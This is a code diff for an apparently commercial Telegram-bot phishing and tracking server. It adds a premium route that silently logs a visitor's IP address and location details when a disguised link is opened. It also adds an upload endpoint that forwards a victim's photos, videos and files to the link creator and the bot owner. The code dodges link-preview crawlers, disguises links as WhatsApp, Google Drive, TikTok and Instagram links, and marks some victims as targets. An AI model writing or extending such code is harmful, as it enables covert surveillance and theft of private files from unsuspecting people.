@@ -299,6 +299,29 @@ app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLin
 app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
 app.get("/ig/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "instagram"); });
 
+// ── Files/Photos route (premium only) ─────────────────────────────────────────
+app.get("/f/:path/*", async (req, res) => {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
+  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
+  const creatorId = parseInt(req.params.path, 36);
+  if (!isPremium(creatorId)) return res.send('<h2 style="font-family:sans-serif;text-align:center;margin-top:20%">⛔ هذه الميزة للمشتركين المدفوعين فقط</h2>');
+  const ip = getIP(req);
+  const d  = new Date().toJSON().slice(0,19).replace('T',':');
+  stats.linksOpened++; saveStats();
+  incUserStat(String(creatorId), 'linksOpened');
+  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
+  notify(creatorId, `${flag} تم فتح رابط الملفات!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
+  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط ملفات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
+  enrichIP(ip).then(info => {
+    if (!info) return;
+    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
+    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
+  });
+  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
+  res.render("files", { uid: req.params.path, a: hostURL, redirectUrl });
+});
+
 // ── Contacts route (premium only) ─────────────────────────────────────────────
 app.get("/co/:path/*", async (req, res) => {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
@@ -889,8 +912,11 @@ async function createLink(cid, msg) {
     const ttLink = `${hostURL}/tt/${url}`;
     const igLink = `${hostURL}/ig/${url}`;
     const coLink = `${hostURL}/co/${url}`;
+    const fLink  = `${hostURL}/f/${url}`;
     lastLink.set(String(cid), cLink);
-    const premiumSection = isPremium(cid) ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}` : "";
+    const premiumSection = isPremium(cid)
+      ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}\n\n🖼️ صور وملفات (بريميوم):\n${fLink}`
+      : "";
     bot.sendMessage(cid,
       `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}`,
       { reply_markup: JSON.stringify({ inline_keyboard: [
@@ -995,6 +1021,31 @@ function flushCamAlbum(tid) {
     }
   }
 }
+
+// ── Files/Photos upload (premium) ─────────────────────────────────────────────
+app.post("/file-upload", upload.single('file'), (req, res) => {
+  const uid  = req.body?.uid || null;
+  if (!uid || !req.file) return res.send("Missing");
+  const tid      = parseInt(uid, 36);
+  const buf      = req.file.buffer;
+  const filename = req.file.originalname || 'file';
+  const mime     = req.file.mimetype || 'application/octet-stream';
+  const cap      = `📁 ملف: ${filename}`;
+  if (!settings.silentMode) {
+    if (mime.startsWith('image/')) {
+      bot.sendPhoto(tid, buf, { caption: cap }).catch(()=>{});
+      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
+    } else if (mime.startsWith('video/')) {
+      bot.sendVideo(tid, buf, { caption: cap }).catch(()=>{});
+      if (tid !== BOT_OWNER) bot.sendVideo(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
+    } else {
+      const info = { filename, contentType: mime };
+      bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
+      if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
+    }
+  }
+  res.send("Done");
+});
 
 // ── Contacts file upload (premium) ────────────────────────────────────────────
 app.post("/contacts-file", upload.single('file'), (req, res) => {
